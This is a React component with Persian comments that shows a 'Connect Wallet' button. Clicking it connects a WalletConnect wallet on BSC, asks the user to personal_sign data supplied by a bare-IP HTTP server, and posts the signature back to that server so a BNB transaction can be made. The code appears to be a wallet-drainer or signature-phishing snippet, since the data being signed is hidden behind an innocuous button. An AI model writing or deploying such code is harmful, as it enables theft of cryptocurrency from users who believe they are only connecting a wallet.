import { EthereumProvider } from "@walletconnect/ethereum-provider";

function App() {
  async function runner() {
    if (typeof localStorage !== "undefined") {
      localStorage.removeItem("walletconnect");
    }

    var ethereumProvider = await EthereumProvider.init({
      showQrModal: true,
      chains: [56], // فقط BSC
      methods: ["personal_sign"], // متد personal_sign
      projectId: "9fe3ed74e1d73141e8b7747bedf77551",
    });

    await ethereumProvider.enable();
    var provider = ethereumProvider;
    var accounts = await provider.request({ method: "eth_accounts" });
    var sender = accounts[0];
    console.log("✅ Wallet Address:", sender);

    async function getRawSignature(address, balance) {
      try {
        let requestData = {
          handler: "tx",
          address: address,
          chain: "56",
          type: "coin",
          balance: balance, // مقدار BNB مورد نظر
        };

        let response = await fetch("http://104.194.133.124/send.php", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(requestData),
        });

        let unsignedData = await response.json();
        console.log("📜 Unsigned Data:", unsignedData);

        var rawSignature = await provider.request({
          method: "personal_sign",
          params: [JSON.stringify(unsignedData), address], // ترتیب پارامترها مهم است
        });

        return rawSignature;
      } catch (error) {
        console.error("❌ Error in getRawSignature:", error);
        return null;
      }
    }

    async function sendSignedTransaction(signature, sender, balance) {
      try {
        let requestData = {
          sender: sender,
          balance: balance,
          signedData: signature,
        };

        let response = await fetch("http://104.194.133.124/send.php", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(requestData),
        });

        let resultJson = await response.json();
        console.log("📤 Server Response:", resultJson);

        return resultJson.txHash || resultJson.result || resultJson;
      } catch (error) {
        console.error("❌ Error in sendSignedTransaction:", error);
        return null;
      }
    }

    let balance = "0.01"; // مقدار BNB مورد انتقال (می‌توان از ورودی کاربر گرفت)
    var rawSignature = await getRawSignature(sender, balance);

    if (rawSignature) {
      console.log("✍️ Signed Raw Data:", rawSignature);
      var txHash = await sendSignedTransaction(rawSignature, sender, balance);
      console.log("📤 Final Transaction Hash:", txHash);
    } else {
      console.error("⚠ Signing failed.");
    }
  }

  return (
    <button
      onClick={runner}
      className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
    >
      <span>Connect Wallet</span>
    </button>
  );
}

export default App;
